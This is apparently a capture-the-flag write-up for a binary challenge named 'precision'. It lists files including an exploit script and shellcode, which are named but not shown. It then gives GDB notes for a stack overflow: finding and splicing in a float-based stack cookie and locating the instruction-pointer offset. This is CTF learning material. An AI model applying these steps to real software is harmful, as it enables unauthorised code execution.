### Files ###
''Disassembly:'' - A commented disassembly of the main function of precision exec

''exploit.py'' - A python program that exploits the precision exec

''intel'' - Some things i grabbed off the server once i had a shell

''precision_a8f6f0590c177948fe06c76a1831e650'' - The executable to exploit

''rootshell'' - Shellcode that spaws a shell. It attempts root but that didnt
seem to work on the remote server. Not supprising.

### My notes for exploiting the executable ###
; >>> break *0x8048583
; The plan is to overrun the buffer with a cyclic pattern then once we hit
; the breakpoint, Examin the memory stored in $esp+0x98.
; >>> x /w $esp+0x98 << Identify the offset in the payload - CYCLIC VALUE 0x62616168 (1650549096)
;  *** STACK COOKIE OFFSET : 128
;
; Next, move forward 2 instructions then test the values in the FP stack
; >>> info registers st0 st1
; ST0 should have : 0x400580aaaa3ad18d2800 stored
; ST1 will be some interpriation of our cyclic pattern. fldl is magaling it some how.
;
; Run the application again without overruning the input buffer. At the break point
; we need to grab the correct stack cookie value: 
; >>> x /w $esp+0x98 << Identify the stack cookie bytes.
;  *** STACK COOKIE BYTES: 0xa5, 0x31, 0x5a, 0x47, 0x55, 0x15, 0x50, 0x40
;
; Next, send the cyclic pattern up with the stack cookie spliced in.
;
; Identify the offset that ends up in the instruction pointer.
; >>> break *0x80485d7
; step forward 1 instruction.  GDB will tell you it cannot read memory at [SOME VALUE] - CYCLIC PATTERN in IP: 0x6261616d
;  *** INSTRUCTION POINTER OFFSET : 148
;
; OTHER NOTES:
; Default stack cookie value @ esp+0x98 : 0x475a31a5, 0x40501555
; Value in ST0 : 0x400580aaaa3ad18d2800
